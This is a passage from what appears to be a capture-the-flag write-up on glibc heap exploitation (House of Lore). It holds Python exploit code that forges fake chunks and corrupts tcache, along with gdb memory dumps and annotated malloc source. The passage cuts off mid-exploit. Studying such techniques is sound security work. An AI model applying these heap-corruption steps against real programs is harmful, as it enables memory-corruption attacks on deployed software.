+</span><span>fake_chunk </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(heap_base</span><span style=color:#f29668>+</span><span style=color:#f29718>0x150</span><span style=color:#f29668>-</span><span style=color:#f29718>0x18</span><span>)   </span><span style=font-style:italic;color:#5c6773>#Using the victim chunk to bypass fd and bk checks
+</span><span>fake_chunk </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(heap_base</span><span style=color:#f29668>+</span><span style=color:#f29718>0x150</span><span style=color:#f29668>-</span><span style=color:#f29718>0x10</span><span>)
+</span><span>fake_chunk </span><span style=color:#f29668>+= </span><span>fake_chunk</span><span style=color:#f29668>.</span><span style=color:#ffb454>ljust</span><span>(</span><span style=color:#f29718>0x210</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'F'</span><span>) </span><span style=font-style:italic;color:#5c6773>#Filling up the fake chunk
+</span><span>fake_chunk </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x220</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x600</span><span>)     </span><span style=font-style:italic;color:#5c6773>#Why 0x600? Let's see!
+</span><span>
+</span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x400</span><span>)
+</span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span>fake_chunk)
+</span><span>
+</span></code></pre><p>Let's see how this setup looks in the memory.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>gdb-peda$ 
+</span><span style=color:#ffb454>0x55555555a570:</span><span>	0x0033333333333333	0x0000000000000411 -</span><span style=color:#f29668>></span><span> This is the chunk of size 0x400 that we added
+</span><span style=color:#ffb454>0x55555555a580:</span><span>	0x0000000000000000	0x0000000000000211 -</span><span style=color:#f29668>></span><span> This is the fake free chunk we created 
+</span><span style=color:#ffb454>0x55555555a590:</span><span>	0x0000555555559138	0x0000555555559140 -</span><span style=color:#f29668>></span><span> fd and bk have been set to point to victim
+</span><span style=color:#ffb454>0x55555555a5a0:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a5b0:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a5c0:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a5d0:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a5e0:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a5f0:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a600:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a610:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a620:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a630:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a640:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a650:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a660:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a670:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a680:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a690:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a6a0:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a6b0:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a6c0:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a6d0:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a6e0:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a6f0:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a700:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a710:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a720:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a730:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a740:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a750:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a760:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a770:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>0x55555555a780:</span><span>	0x4646464646464646	0x4646464646464646
+</span><span style=color:#ffb454>gdb-peda$ 
+</span><span style=color:#ffb454>0x55555555a790:</span><span>	0x0000000000000210	0x0000000000000600  -</span><span style=color:#f29668>></span><span> Another chunk of 0x600 set up to trick malloc into thinking that previous chunk is free
+</span><span style=color:#ffb454>0x55555555a7a0:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a7b0:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a7c0:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a7d0:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a7e0:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a7f0:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a800:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a810:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a820:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a830:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a840:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a850:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a860:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a870:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a880:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a890:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a8a0:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a8b0:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a8c0:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a8d0:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a8e0:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a8f0:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>gdb-peda$ 
+</span><span style=color:#ffb454>0x55555555a900:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a910:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a920:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a930:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a940:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a950:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a960:</span><span>	0x6161616161616161	0x6161616161616161
+</span><span style=color:#ffb454>0x55555555a970:</span><span>	0x6161616161616161	0x0061616161616161
+</span><span style=color:#ffb454>gdb-peda$ 
+</span><span style=color:#ffb454>0x55555555a980:</span><span>	0x0000000000000000	0x000000000001f681   -</span><span style=color:#f29668>></span><span> This is the top chunk
+</span><span>
+</span></code></pre><p>It is also very interesting to see the bss table where our chunks are stored based on their indices.<p>Now adding another chunk of size 0x400 and free the chunk which had the fake chunk , thus corrupting the size of fake chunk we created with a large heap address.<pre style=background:#0f1419;color:#bfbab0><code><span>add(2,cyclic(0x400)) #Also preventing top consolidation
+</span><span>free(1)
+</span></code></pre><p>This is how the heap looks with our fake chunk's size overwritten with tcache heap address.<pre style=background:#0f1419;color:#bfbab0><code><span>gdb-peda$ 
+</span><span>0x55555555a570:	0x0033333333333333	0x0000000000000411
+</span><span>0x55555555a580:	0x0000000000000000	0x0000555555559010 -> The size of our chunk corrupted with bk of the new freed chunk
+</span><span>0x55555555a590:	0x0000555555559138	0x0000555555559140
+</span><span>0x55555555a5a0:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a5b0:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a5c0:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a5d0:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a5e0:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a5f0:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a600:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a610:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a620:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a630:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a640:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a650:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a660:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a670:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a680:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a690:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a6a0:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a6b0:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a6c0:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a6d0:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a6e0:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a6f0:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a700:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a710:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a720:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a730:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a740:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a750:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a760:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a770:	0x4646464646464646	0x4646464646464646
+</span><span>0x55555555a780:	0x4646464646464646	0x4646464646464646
+</span><span>gdb-peda$ 
+</span><span>0x55555555a790:	0x0000000000000210	0x0000000000000600
+</span></code></pre><p>The reason we set the next size to <code>0x600</code> was that , after adding another chunk of size 0x400 , the next of our fake chunk now points to top chunk.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>gdb-peda$</span><span> x/4gx 0x55555555a790+0x600
+</span><span style=color:#ffb454>0x55555555ad90:</span><span>	0x0000000000000000	0x000000000001f271 -</span><span style=color:#f29668>></span><span> Top Chunk
+</span><span style=color:#ffb454>0x55555555ada0:</span><span>	0x0000000000000000	0x0000000000000000
+</span></code></pre><p>All this is set to trigger the vulnerability to leverage <strong>House Of Lore</strong>.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=font-style:italic;color:#5c6773>/*
+</span><span style=font-style:italic;color:#5c6773>       If a small request, check regular bin.  Since these "smallbins"
+</span><span style=font-style:italic;color:#5c6773>       hold one size each, no searching within bins is necessary.
+</span><span style=font-style:italic;color:#5c6773>       (For a large request, we need to wait until unsorted chunks are
+</span><span style=font-style:italic;color:#5c6773>       processed to find best fit. But for small ones, fits are exact
+</span><span style=font-style:italic;color:#5c6773>       anyway, so we can check now, which is faster.)
+</span><span style=font-style:italic;color:#5c6773>     */
+</span><span>
+</span><span>    </span><span style=color:#ff7733>if </span><span>(</span><span style=color:#ffb454>in_smallbin_range</span><span>(nb)) {
+</span><span>        </span><span style=font-style:italic;color:#5c6773>// Get the index of the small bin
+</span><span>        idx </span><span style=color:#f29668>= </span><span style=color:#ffb454>smallbin_index</span><span>(nb)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=font-style:italic;color:#5c6773>// Get the corresponding chunk pointer in the small bin
+</span><span>        bin </span><span style=color:#f29668>= </span><span style=color:#ffb454>bin_at </span><span>(av</span><span style=color:#bfbab0cc>,</span><span> idx)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=font-style:italic;color:#5c6773>// First execute victim= last(bin) to get the last chunk of the small bin
+</span><span>        </span><span style=font-style:italic;color:#5c6773>// If victim = bin , then the bin is empty.
+</span><span>        </span><span style=font-style:italic;color:#5c6773>// If they are not equal, then there will be two cases
+</span><span>        </span><span style=color:#ff7733>if </span><span>((victim </span><span style=color:#f29668>= </span><span style=color:#ffb454>last</span><span>(bin)) </span><span style=color:#f29668>!=</span><span> bin) {
+</span><span>            </span><span style=font-style:italic;color:#5c6773>// In the first case, the small bin has not yet been initialized.
+</span><span>            </span><span style=color:#ff7733>if </span><span>(victim </span><span style=color:#f29668>== </span><span style=color:#f29718>0</span><span>) </span><span style=font-style:italic;color:#5c6773>/* initialization check */
+</span><span>                </span><span style=font-style:italic;color:#5c6773>// Perform initialization to merge chunks in fast bins
+</span><span>                </span><span style=color:#ffb454>malloc_consolidate </span><span>(of)</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=font-style:italic;color:#5c6773>// In the second case, there is a free chunk in the small bin
+</span><span>            </span><span style=color:#ff7733>else </span><span>{
+</span><span>                </span><span style=font-style:italic;color:#5c6773>// Get the second-to-last chunk in the small bin.
+</span><span>                bck </span><span style=color:#f29668>=</span><span> victim</span><span style=color:#f29668>-></span><span>bk</span><span style=color:#bfbab0cc>;
+</span><span>                </span><span style=font-style:italic;color:#5c6773>// Check if bck->fd is victim, prevent forgery
+</span><span>                </span><span style=color:#ff7733>if </span><span>(</span><span style=color:#ffb454>__glibc_unlikely</span><span>(bck</span><span style=color:#f29668>-></span><span>fd </span><span style=color:#f29668>!=</span><span> victim)) {
+</span><span>                    errstr </span><span style=color:#f29668>= </span><span style=color:#c2d94c>"malloc(): smallbin double linked list corrupted"</span><span style=color:#bfbab0cc>;
+</span><span>                    </span><span style=color:#ff7733>goto</span><span> errout</span><span style=color:#bfbab0cc>;
+</span><span>                }
+</span><span>                </span><span style=font-style:italic;color:#5c6773>// Set the corresponding inuse bit of victim
+</span><span>                </span><span style=color:#ffb454>set_inuse_bit_at_offset</span><span>(victim</span><span style=color:#bfbab0cc>,</span><span> nb)</span><span style=color:#bfbab0cc>;
+</span><span>                </span><span style=font-style:italic;color:#5c6773>// Modify the small bin list, take the last chunk of the small bin
+</span><span>                bin</span><span style=color:#f29668>-></span><span> bk </span><span style=color:#f29668>=</span><span> bck</span><span style=color:#bfbab0cc>;
+</span><span>                bck</span><span style=color:#f29668>-></span><span>fd </span><span style=color:#f29668>=</span><span> bin</span><span style=color:#bfbab0cc>;
+</span><span>                </span><span style=font-style:italic;color:#5c6773>// If it is not main_arena, set the corresponding flag
+</span><span>                </span><span style=color:#ff7733>if </span><span>(av </span><span style=color:#f29668>!= &</span><span>main_arena) </span><span style=color:#ffb454>set_non_main_arena</span><span>(victim)</span><span style=color:#bfbab0cc>;
+</span><span>                </span><span style=font-style:italic;color:#5c6773>// Detailed inspection
+</span><span>                </span><span style=color:#ffb454>check_malloced_chunk </span><span>(off</span><span style=color:#bfbab0cc>,</span><span> victim</span><span style=color:#bfbab0cc>,</span><span> nb)</span><span style=color:#bfbab0cc>;
+</span><span>                </span><span style=font-style:italic;color:#5c6773>// Convert the requested chunk to the corresponding mem state
+</span><span>                </span><span style=color:#ff7733>void </span><span style=color:#f29668>*</span><span>p </span><span style=color:#f29668>= </span><span style=color:#ffb454>chunk2mem</span><span>(victim)</span><span style=color:#bfbab0cc>;
+</span><span>                </span><span style=font-style:italic;color:#5c6773>// If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff
+</span><span>                </span><span style=color:#ffb454>alloc_perturb</span><span>(p</span><span style=color:#bfbab0cc>,</span><span> bytes)</span><span style=color:#bfbab0cc>;
+</span><span>                </span><span style=color:#ff7733>return</span><span> p</span><span style=color:#bfbab0cc>;
+</span><span>            }
+</span><span>        }
+</span><span>    }
+</span><span>
+</span></code></pre><p>Calling malloc and now allocating the chunk which is in tcache as well as unsorted bin , hence we get a tcache chunk which is in libc <code>main_arena</code> struct due to unsafe unlink.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ffb454>secret</span><span>(</span><span style=color:#ffb454>p64</span><span>(heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1130</span><span>))   
+</span></code></pre><p>Let's take a look at memory layout after this.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>gdb-peda$
+</span><span style=color:#ffb454>0x555555559000:</span><span>	0x0000000000000000	0x0000000000000251
+</span><span style=color:#ffb454>0x555555559010:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555559020:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555559030:</span><span>	0x0000000000000006	0x0000000000000000
+</span><span style=color:#ffb454>0x555555559040:</span><span>	0x0000000000000000	0x0100000000000000
+</span><span style=color:#ffb454>0x555555559050:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555559060:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555559070:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555559080:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555559090:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x5555555590a0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x5555555590b0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x5555555590c0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x5555555590d0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x5555555590e0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x5555555590f0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555559100:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555559110:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555559120:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555559130:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555559140:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555559150:</span><span>	0x00007ffff7fefeb0	0x0000000000000000 -</span><span style=color:#f29668>></span><span> Victim chunk from main_arena
+</span></code></pre><p>Now we consolidate 6 chunks of 0x200 size into top.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
+</span><span style=color:#ff7733>for </span><span>i </span><span style=color:#ff7733>in </span><span style=font-style:italic;color:#39bae6>xrange</span><span>(</span><span style=color:#f29718>6</span><span>):
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'4'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x1f0</span><span>)
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>
+</span></code></pre></section></article></main></div>
